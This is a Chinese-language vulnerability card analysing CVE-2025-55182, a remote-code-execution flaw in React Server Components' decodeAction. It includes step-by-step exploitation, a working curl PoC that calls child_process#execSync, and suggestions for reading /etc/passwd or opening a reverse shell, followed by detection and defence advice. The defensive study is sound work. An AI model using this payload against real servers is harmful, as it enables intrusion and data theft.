---
id: web-nodejs-deserialization-react-decodeaction-actionref-arbitrary-module-export
title: React Server Components decodeAction 任意模块导出调用：$ACTION_REF 指向 child_process#execSync 直接 RCE（CVE-2025-55182）
type: scenario
domain: web
path: web/nodejs/deserialization
technique: react-decodeaction-actionref-module-export-rce
aliases:
- CVE-2025-55182
- React2Shell
- $ACTION_REF_0
- decodeAction 任意模块导出
- requireModule hasOwnProperty
- child_process#execSync
- serverManifest 绕过
- React Server Action RCE
tags:
- nodejs
- react
- nextjs
- server-action
- deserialization
- module-export
- rce
- cve-2025-55182
cve:
- CVE-2025-55182
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T08:47:36+08:00'
  notes: '已对照原文与4张内联图核对：decodeAction 的 $ACTION_REF_/$ACTION_ID_ 分支、decodeBoundActionMetaData 读取 $ACTION_0:0、resolveServerReference 以 # 分割、requireModule 的 moduleExports[metadata[2]] 无 hasOwnProperty 检查、child_process#execSync+bound 参数与 /formaction PoC 均与原文一致；响应回显 Buffer 字节数组见原图。原文未给受影响版本区间，未设置 affected_versions；frontmatter 无 sources/source_url。原文复现为作者环境，本会话未执行 PoC。'
---

## 一句话结论

React Server Components 的 `decodeAction` 处理 `$ACTION_REF_*` 字段时，会按 `$ACTION_<n>:` 读取客户端提交的 bound action 元数据，并把其中的 `id`（`模块#导出名`）交给 `loadServerReference`；`requireModule` 最后执行 `moduleExports[metadata[2]]` 时没有 `hasOwnProperty`/白名单校验，攻击者用 `id: "child_process#execSync"` 加 `bound: ["ifconfig"]` 就能调用任意模块导出并在响应中拿到命令输出，单请求 RCE。

## 原理

- **入口 `decodeAction(body, serverManifest)`**：
  ```js
  body.forEach(function (value, key) {
    key.startsWith("$ACTION_")
      ? key.startsWith("$ACTION_REF_")
        ? ((value = "$ACTION_" + key.slice(12) + ":"),
          (value = decodeBoundActionMetaData(body, serverManifest, value)),
          (action = loadServerReference(serverManifest, value.id, value.bound)))
        : key.startsWith("$ACTION_ID_") &&
          ((value = key.slice(11)),
          (action = loadServerReference(serverManifest, value, null)))
      : formData.append(key, value);
  });
  ```
  `$ACTION_REF_0` 的值会变成 `$ACTION_0:` 前缀，`decodeBoundActionMetaData` 再从请求体读取 `$ACTION_0:0` 这个字段（客户端完全可控的 JSON），得到 `{id, bound}`。
- **`loadServerReference`**：`resolveServerReference(bundlerConfig, id)` 用 `#` 分割 `id`，前半是模块、后半是导出名（如 `child_process#execSync`）；随后 `requireModule(serverReference)` 取模块导出：
  ```js
  function requireModule(metadata) {
    var moduleExports = __webpack_require__(metadata[0]);
    ...
    return "*" === metadata[2]
      ? moduleExports
      : "" === metadata[2]
        ? (moduleExports.__esModule ? moduleExports.default : moduleExports)
        : moduleExports[metadata[2]];   // 缺少 hasOwnProperty/白名单
  }
  ```
  `metadata[2]` 就是 `id` 中 `#` 后的导出名，完全由攻击者控制；代码没有验证该导出是否在 `serverManifest` 中声明，也没有检查是否为模块自身属性。
- **绑定与执行**：`loadServerReference` 在 `bound` 存在时执行 `fn.bind.apply(fn, [null].concat(bound))`，把 `bound` 数组作为参数绑定到目标函数；`execSync('ifconfig')` 立即执行，结果作为 action 返回值进入响应。
- **为什么是“任意模块导出”而不是仅限 serverManifest**：`serverManifest` 只列出应用声明的 Server Actions（如 `createUser`、`deleteUser`、`uploadImage`），但 `requireModule` 拿到的是整个模块的导出对象；只要模块在打包映射中（如 `child_process`），攻击者就能调用其任意导出（`execSync`、`spawn`、`execFile` 等），绕过“只能调用声明过的 action”的信任边界。
- **响应回显**：PoC 的 JSON 响应包含 `{"success":true,"result":{"type":"Buffer","data":[105,102,99,111,...]}}`，`data` 数组就是 `ifconfig` 的字节输出，可直接解码读取。

## 触发条件

- 目标为存在该 `decodeAction` 缺陷的 React Server Components / React Server DOM 版本（CVE-2025-55182；原文未给具体版本区间，需按官方公告）。
- 应用暴露 Server Action 端点（PoC 为 `/formaction`；Next.js 常见为 `/apps`、`/signin` 或自定义 action 路由），能解析 multipart 的 `$ACTION_REF_*`/`$ACTION_ID_*` 字段。
- 打包映射中存在带危险导出的 Node 模块（如 `child_process`、`vm`、`fs`）；`resolveServerReference` 能解析到该模块。
- 目标未对 action 字段名/`id`/`bound` 做白名单，WAF 未拦截 `$ACTION_REF_`、`#`、`child_process` 等特征。

## 利用步骤

1. 确认目标 Server Action 端点与 multipart 解析行为：先发一个普通 `$ACTION_ID_*` 或表单请求，观察响应格式。
2. 构造两个字段：
   - `$ACTION_REF_0=`（值可空）；
   - `$ACTION_0:0={"id":"child_process#execSync","bound":["ifconfig"]}`。
3. 发送 POST，观察响应 JSON 中 `result.data` 是否为命令输出的字节数组。
4. 把 `ifconfig` 换成 `id`、`whoami`、`cat /etc/passwd` 等；或换 `child_process#exec`/`spawn` 做反弹 shell。
5. 若目标模块映射中没有 `child_process`，尝试其他可解析模块/导出（`vm#runInThisContext`、`fs#readFileSync` 等），或改用 Flight chunk 原型链向量（见关联卡）。

## PoC

```bash
curl -X POST http://localhost:3002/formaction \
  -F '$ACTION_REF_0=' \
  -F '$ACTION_0:0={"id":"child_process#execSync","bound":["ifconfig"]}'
```

响应（节选）：

```json
{"success":true,"result":{"type":"Buffer","data":[105,102,99,111,110,102,105,103,...]}}
```

`data` 为 `ifconfig` 输出的字节数组，解码即命令结果。

说明：PoC 使用原文的 `CVE-2025-55182-poc` 环境（端口 3002、`/formaction`）；实际目标端点与可解析模块按部署调整。原文完整复现并给出响应截图，本会话未执行。

## 变体与关联

- **模块/导出变体**：`child_process#exec`、`child_process#spawn`、`child_process#execFile`、`vm#runInThisContext`、`fs#readFileSync` 等；只要模块在打包映射中且导出名可控。
- **字段变体**：`$ACTION_ID_<id>` 直接指定 ID；`$ACTION_REF_<n>` + `$ACTION_<n>:<m>` 组合；`bound` 可传多个参数。
- **回显变体**：`execSync` 返回 Buffer；`exec`/`spawn` 可能异步或需回调，响应形态不同；也可做外带/反弹。
- **与 Flight chunk 向量的区别**：本卡走 `decodeAction` 的 server reference/模块导出路径（`$ACTION_REF`、`requireModule`）；另一条向量走 Flight chunk 的 `$1:__proto__:then` + `$B` Function 构造器（见关联卡），两者同属 CVE-2025-55182 但入口与根因不同。
- 关联：[[web-nodejs-deserialization-react-flight-chunk-proto-function-rce]]（同一 CVE 的 chunk 原型链向量）；[[web-nodejs-deserialization-qwik-server-qrl-rce]]（服务端 QRL 指定模块与符号的同类模式）；[[web-nodejs-deserialization-node-serialize-funcflag-iife-rce]]（反序列化直接构造函数执行）。

## 检测与防御

- **升级**：升级 React Server Components/React Server DOM 到修复版本（CVE-2025-55182；原文未给版本区间，按官方公告）。
- **代码修复**：`requireModule` 对 `metadata[2]` 使用 `hasOwnProperty` 并只允许 `serverManifest` 声明的导出；`resolveServerReference` 对 `id` 做模块/导出白名单，拒绝 `child_process`、`vm`、`fs` 等危险模块；不要仅凭 `#` 分割就信任导出名。
- **输入检测**：multipart 字段名含 `$ACTION_REF_`、`$ACTION_ID_`，值为 `{"id":"...","bound":[...]}`；`id` 含 `child_process#`、`vm#`、`fs#`、`#exec`、`#spawn`；响应出现 Buffer 字节数组或系统命令输出。
- **运行时检测**：Node 进程由 Server Action 请求触发 `child_process.execSync/spawn`；响应时间/内容与 action 业务不符；WAF/网关记录异常 `$ACTION_` 字段。
- **加固**：Server Action 端点限制来源与认证；RSC 服务最小权限、容器只读、限制命令执行与出站；对 action 字段做结构校验（只允许预期字段名与 ID）。
